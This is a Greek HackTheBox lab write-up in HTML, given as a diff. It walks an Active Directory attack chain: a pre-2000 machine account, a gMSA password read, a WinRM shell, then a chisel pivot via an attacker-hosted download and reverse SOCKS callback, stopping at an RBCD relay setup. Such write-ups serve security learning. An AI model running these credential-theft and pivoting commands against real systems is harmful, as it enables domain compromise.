@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Pirate — S. Markakis</title>
+<meta name="description" content="HackTheBox Pirate — μια πλήρης αλυσίδα Active Directory οδηγημένη από macOS: ένας pre-Windows 2000 λογαριασμός machine που ακόμα κρατά το bootstrap password του κάνει bootstrap το Kerberos, ένα αναγνώσιμο gMSA δίνει WinRM στον DC, μια coercion NTLM-relay + PrinterBug φυτεύει RBCD σε έναν εσωτερικό web server για να ανακτήσει έναν χρήστη domain, ένα ForceChangePassword ξεκλειδώνει έναν λογαριασμό delegation, και το SPN-jacking ενός SPN constrained-delegation πάνω στον DC αποδίδει Domain Admin.">
+<meta property="og:title" content="HTB: Pirate — S. Markakis">
+<meta property="og:description" content="HackTheBox Pirate — μια πλήρης αλυσίδα Active Directory οδηγημένη από macOS: λογαριασμός machine pre2k → αναγνώσιμο gMSA → RBCD μέσω NTLM relay + PrinterBug → ένας χρήστης domain → ForceChangePassword → SPN-jacking ενός SPN constrained-delegation πάνω στον DC για Domain Admin.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-pirate-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-pirate.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-pirate.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-pirate-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-pirate.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-pirate-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-pirate.html">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+  .tag-win  { background: #c0d0e0; color: #1e3a5a; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Pirate",
+  "description": "HackTheBox Pirate — μια πλήρης αλυσίδα Active Directory οδηγημένη από macOS: ένας pre-Windows 2000 λογαριασμός machine που ακόμα κρατά το bootstrap password του κάνει bootstrap το Kerberos, ένα αναγνώσιμο gMSA δίνει WinRM στον DC, μια coercion NTLM-relay + PrinterBug φυτεύει RBCD σε έναν εσωτερικό web server για να ανακτήσει έναν χρήστη domain, ένα ForceChangePassword ξεκλειδώνει έναν λογαριασμό delegation, και το SPN-jacking ενός SPN constrained-delegation πάνω στον DC αποδίδει Domain Admin.",
+  "datePublished": "2026-09-11",
+  "dateModified": "2026-09-11",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-pirate-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-pirate.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-pirate"
+  },
+  "timeRequired": "PT14M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-pirate.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <div class="post-header">
+    <h1>HTB: Pirate</h1>
+    <div class="post-meta">
+      <span class="date">11 Σεπτεμβρίου 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-win">Windows</span>
+      <span class="tag">Active Directory</span>
+      <span>&nbsp;14 λεπτά αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Το Pirate είναι ένα box Active Directory assumed-breach — ξεκινάς με έναν λογαριασμό domain χαμηλού-προνομίου — και κάθε άλμα είναι ένα credential που ποτέ δεν έπρεπε να είναι προσβάσιμο. Ένας <strong>pre-Windows 2000 λογαριασμός machine</strong> ακόμα κρατά το bootstrap password με το οποίο δημιουργήθηκε, που κάνει bootstrap το Kerberos. Εκείνος ο λογαριασμός μπορεί να διαβάσει το managed password ενός <strong>gMSA</strong>, και το gMSA είναι στο <em>Remote Management Users</em> → ένα shell WinRM στον DC. Ο DC είναι dual-homed, κρύβοντας έναν εσωτερικό web server, οπότε η επόμενη κίνηση είναι ένα κλασικό <strong>NTLM relay</strong>: κάνε coerce τον λογαριασμό machine του web server με <strong>PrinterBug</strong>, κάνε το relay στο LDAP, και γράψε <strong>resource-based constrained delegation</strong> ώστε να μπορούμε να κάνουμε impersonate τον τοπικό admin του και να τραβήξουμε έναν πραγματικό χρήστη domain από το LSA. Εκείνος ο χρήστης μπορεί να κάνει <strong>ForceChangePassword</strong> σε έναν λογαριασμό delegation, και το SPN constrained-delegation του λογαριασμού delegation είναι <em>μεταβλητό</em> — οπότε κάνουμε <strong>SPN-jack</strong> πάνω στον DC και κόβουμε ένα ticket Domain Admin προς τον ίδιο τον DC. Όλο αυτό οδηγήθηκε από ένα Mac, που πρόσθεσε μερικούς δικούς του γρίφους.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">pentest</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">pre2k MS01$</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">gMSA → WinRM (DC01)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">RBCD relay (WEB01)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">a.white (user)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">ForceChangePassword</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">SPN-jack → DA</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Αναγνώριση</h2>
+
+  <p>Το box σου δίνει ένα αρχικό credential — <code>pentest : p3nt3st2025!&amp;</code> — οπότε αυτό είναι assumed-breach: κανένα exploit για την μπροστινή πόρτα, μόνο ένα authenticated foothold μέσα στο domain. Μια γρήγορη σάρωση είναι σχολικό βιβλίο domain controller: Kerberos, LDAP, το global catalog, SMB, και WinRM. Server 2019, domain <code>pirate.htb</code>, hostname <code>DC01</code>.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap + credential check</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -Pn -p88,389,445,3268,5985 --open &lt;DC_IP&gt;</span>
+<span class="po">88/tcp   open  kerberos-sec
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+3268/tcp open  globalcatLDAP
+5985/tcp open  wsman</span>
+<span class="pd">$ </span><span class="pc">nxc smb &lt;DC_IP&gt; -u pentest -p 'p3nt3st2025!&amp;'</span>
+<span class="po">SMB  &lt;DC_IP&gt;  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:True)
+</span><span class="pg">SMB  &lt;DC_IP&gt;  445  DC01  [+] pirate.htb\pentest:p3nt3st2025!&amp;</span></div>
+  </div>
+
+  <p>Πρόσθεσε τα ονόματα στο <code>/etc/hosts</code> (<code>pirate.htb</code>, <code>dc01.pirate.htb</code>) — το Kerberos κάνει resolve service principals με βάση το hostname, οπότε το να δουλεύεις μόνο με IP σπάει τη στιγμή που αγγίζεις ένα ticket.</p>
+
+  <!-- ══ PRE2K ══ -->
+  <h2>Foothold — ένας λογαριασμός machine pre-Windows 2000</h2>
+
+  <p>Η καταμέτρηση αντικειμένων computer μέσω LDAP αναδεικνύει περισσότερα από τους δύο hosts που θα περίμενες:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nxc ldap --computers</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc ldap &lt;DC_IP&gt; -u pentest -p 'p3nt3st2025!&amp;' --computers</span>
+<span class="po">DC01$
+WEB01$
+MS01$
+EXCH01$
+gMSA_ADCS_prod$
+gMSA_ADFS_prod$</span></div>
+  </div>
+
+  <p>Δύο λογαριασμοί machine — <code>MS01$</code> και <code>EXCH01$</code> — κουβαλούν τη σημαία <strong>Pre-Windows 2000</strong>. Όταν ένας admin προδημιουργεί ένα αντικείμενο computer για έναν host που δεν έχει κάνει join στο domain ακόμα, το αρχικό του password ορίζεται στο <em>πεζό sAMAccountName χωρίς το τελικό dollar sign</em>. Αν ο host δεν κάνει ποτέ join (<code>lastLogon = 0</code>), εκείνο το bootstrap password είναι ακόμα ζωντανό. Το module <code>pre2k</code> του netexec σημαίνει ακριβώς αυτό:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">pre2k discovery</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc ldap &lt;DC_IP&gt; -u pentest -p 'p3nt3st2025!&amp;' -M pre2k</span>
+<span class="py">PRE2K  Pre-created computer account: MS01$
+PRE2K  Pre-created computer account: EXCH01$</span></div>
+  </div>
+
+  <p>Οπότε το password του <code>MS01$</code> θα έπρεπε να είναι <code>ms01</code>. Δεν μπορείς να το δοκιμάσεις με κανονικό logon όμως — οι λογαριασμοί machine αρνούνται interactive/NTLM authentication (<code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>). Όλα από εδώ και πέρα είναι <strong>μόνο-Kerberos</strong>. Πιάσε ένα TGT για να αποδείξεις το password και να το κουβαλήσεις στο επόμενο βήμα:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">getTGT — MS01$</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">getTGT.py 'pirate.htb/MS01$:ms01' -dc-ip &lt;DC_IP&gt;</span>
+<span class="pg">[*] Saving ticket in MS01$.ccache</span>
+<span class="pd">$ </span><span class="pc">export KRB5CCNAME=MS01\$.ccache</span></div>
+  </div>
+
+  <div class="alert alert-warn">Παρένθεση macOS: το ρολόι του DC ήταν <strong>+7 ώρες</strong> μπροστά από μένα, οπότε κάθε ωμή κλήση Kerberos πέθαινε με <code>KRB_AP_ERR_SKEW</code>. Αντί να επαναφέρω το ρολόι συστήματος τύλιξα το Impacket σε <code>faketime -f '+7h' &lt;tool&gt;</code>. Το bloodyAD είναι καλύτερο — εντοπίζει το skew και ξαναδοκιμάζει αυτόματα. Περισσότερα για τις παραξενιές macOS στο τέλος.</div>
+
+  <!-- ══ gMSA ══ -->
+  <h2>gMSA — διαβάζοντας ένα managed password → WinRM στον DC</h2>
+
+  <p>Ένα <strong>group Managed Service Account</strong> έχει ένα password 240-bytes που το AD περιστρέφει μόνο του και ποτέ δεν δείχνει σε admin. Η παγίδα: κάθε principal που είναι λισταρισμένος στο <code>msDS-GroupMSAMembership</code> του gMSA (το σύνολο "principals allowed to retrieve managed password") μπορεί να διαβάσει το blob μέσω LDAP και να παράγει το hash NT από αυτό. Το φρέσκο-κατακτημένο μας <code>MS01$</code> είναι τέτοιο principal. Το bloodyAD το διαβάζει και επιστρέφει το hash απευθείας:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">bloodyAD — read gMSA managed password</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">KRB5CCNAME=MS01\$.ccache bloodyAD --host dc01.pirate.htb -d pirate.htb -k \
+     get object 'gMSA_ADFS_prod$' --attr msDS-ManagedPassword</span>
+<span class="po">Clock skew detected. Adjusting local time by 6:59:59. Retrying operation.
+distinguishedName: CN=gMSA_ADFS_prod,CN=Managed Service Accounts,DC=pirate,DC=htb</span>
+<span class="pg">msDS-ManagedPassword.NT: e819498e................................</span></div>
+  </div>
+
+  <p>Εκείνο το hash NT είναι ένα πλήρες credential για τον <code>gMSA_ADFS_prod$</code> — και ο λογαριασμός τυχαίνει να είναι στο <em>Remote Management Users</em>, οπότε μπορεί να κάνει login μέσω WinRM. Το netexec επιβεβαιώνει exec επιπέδου-admin, και το evil-winrm ρίχνει ένα shell στον DC:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">WinRM as gMSA_ADFS_prod$</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc winrm dc01.pirate.htb -u 'gMSA_ADFS_prod$' -H e819498e...</span>
+<span class="pg">WINRM  dc01.pirate.htb  5985  DC01  [+] pirate.htb\gMSA_ADFS_prod$:e819498e... (Pwn3d!)</span>
+<span class="pd">$ </span><span class="pc">evil-winrm -i dc01.pirate.htb -u 'gMSA_ADFS_prod$' -H e819498e...</span></div>
+  </div>
+
+  <p>Πρώτο πράγμα μέσα: <code>ipconfig</code>. Ο DC είναι <strong>dual-homed</strong>.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">DC01 interfaces</span>
+    </div>
+    <div class="term-body"><span class="pd">PS&gt; </span><span class="pc">ipconfig</span>
+<span class="po">   IPv4 Address. . . . . . : 192.168.100.1     </span><span class="pco"># internal</span><span class="po">
+   IPv4 Address. . . . . . : &lt;DC_IP&gt;            </span><span class="pco"># the network we came in on</span></div>
+  </div>
+
+  <p>Υπάρχει ένα <code>192.168.100.0/24</code> πίσω από τον DC, και από το προηγούμενο LDAP dump ξέρουμε ότι το <code>WEB01$</code> ζει εκεί — <code>192.168.100.2</code>, απευθείας απρόσιτο. Τα flags δεν είναι στα αναγνώσιμα desktops του DC, οπότε ο επόμενος στόχος είναι εκείνος ο εσωτερικός host. Ώρα για pivot.</p>
+
+  <!-- ══ PIVOT ══ -->
+  <h2>Pivoting στο εσωτερικό δίκτυο (από macOS)</h2>
+
+  <p>Το tunnel της οικίας γι' αυτό είναι το ligolo, αλλά το TUN + interactive console του είναι δύσκολο να γίνει script σε macOS, οπότε χρησιμοποίησα αντ' αυτού <strong>chisel reverse SOCKS</strong> — εντελώς non-interactive, δεν χρειάζεται root για το ίδιο το proxy. Τρέξε τον server στο box επίθεσης, στήσε τον client πάνω στον DC μέσω του shell WinRM, και κάλεσε πίσω:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">chisel reverse SOCKS</span>
+    </div>
+    <div class="term-body"><span class="pco"># attacker</span>
+<span class="pd">$ </span><span class="pc">./chisel server --reverse --socks5 -p 9001</span>
+<span class="pco"># on DC01, via the WinRM shell — download + dial back</span>
+<span class="pd">PS&gt; </span><span class="pc">iwr http://&lt;ATTACKER&gt;:8000/chisel.exe -OutFile C:\Windows\Temp\c.exe</span>
+<span class="pd">PS&gt; </span><span class="pc">C:\Windows\Temp\c.exe client &lt;ATTACKER&gt;:9001 R:socks</span>
+<span class="po">server: session#2: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening</span></div>
+  </div>
+
+  <div class="alert alert-info">Μια παγίδα που αξίζει να ξέρεις: μια διαδικασία-παιδί που ξεκινά από μια εντολή WinRM one-shot σκοτώνεται όταν το job object εκείνης της εντολής καταρρέει. Κράτα το κανάλι WinRM που εκκίνησε το chisel <em>ανοιχτό</em> (τρέξ' το στο foreground ενός backgrounded session) ώστε το tunnel να επιβιώσει.</div>
+
+  <p>Με το SOCKS πάνω στο <code>127.0.0.1:1080</code>, το <code>WEB01</code> είναι προσβάσιμο — 445, 135, 5985 και μια υπηρεσία HTTP στη 80. Μια σημείωση για συνάδελφους χρήστες Mac: το <strong>netexec σπάει κάτω από proxychains</strong> (οι multiprocessing workers του δεν κληρονομούν το hook <code>DYLD_INSERT_LIBRARIES</code>), αλλά τα single-process scripts Impacket κάνουν proxy μια χαρά. Οπότε η καταμέτρηση και κάθε βήμα σχετικό-με-relay παρακάτω τρέχουν σαν <code>proxychains4 &lt;impacket-tool&gt;</code>.</p>
+
+  <!-- ══ RBCD ══ -->
+  <h2>WEB01 — NTLM relay → RBCD → ένας χρήστης domain</h2>
+
+  <p>Το gMSA μπορεί να κάνει authenticate στο <code>WEB01</code> αλλά δεν είναι τοπικός admin εκεί (<code>rpc_s_access_denied</code> σε ένα secrets dump). Αυτό που το <code>WEB01</code> <em>έχει</em> πραγματικά είναι <strong>απενεργοποιημένο SMB signing</strong> — το πράσινο φως για ένα NTLM relay. Το σχέδιο:</p>
+
+  <ol>
+    <li>Κάνε coerce το <code>WEB01$</code> να κάνει authenticate σε εμάς (PrinterBug / MS-RPRN).</li>
+    <li>Κάνε relay εκείνο το auth του λογαριασμού machine στο LDAP του DC.</li>
+    <li>Χρησιμοποίησέ το για να γράψεις <strong>resource-based constrained delegation</strong> στο <code>WEB01$</code>, εμπιστευόμενο έναν λογαριασμό computer που ελέγχουμε.</li>
+    <li>Κάνε S4U στον εαυτό μας ένα ticket Administrator στο <code>WEB01</code> και κάνε dump τα secrets του.</li>
+  </ol>
+
+  <p>Πρώτα, δημιούργησε τον λογαριασμό computer μέσα από τον οποίο θα κάνουμε delegate — κάθε authenticated χρήστης μπορεί, μέχρι το <code>ms-DS-MachineAccountQuota</code> (default 10):</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">add a controllable computer account</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">addcomputer.py -computer-name 'hackpuntes$' -computer-pass '1Qwerty!' \
+     -dc-host dc01.pirate.htb -hashes :e819498e... 'pirate.htb/gMSA_ADFS_prod$'</span>
+<span class="pg">[*] Successfully added machine account hackpuntes$ with password 1Qwerty!.</span></div>
+  </div>
+
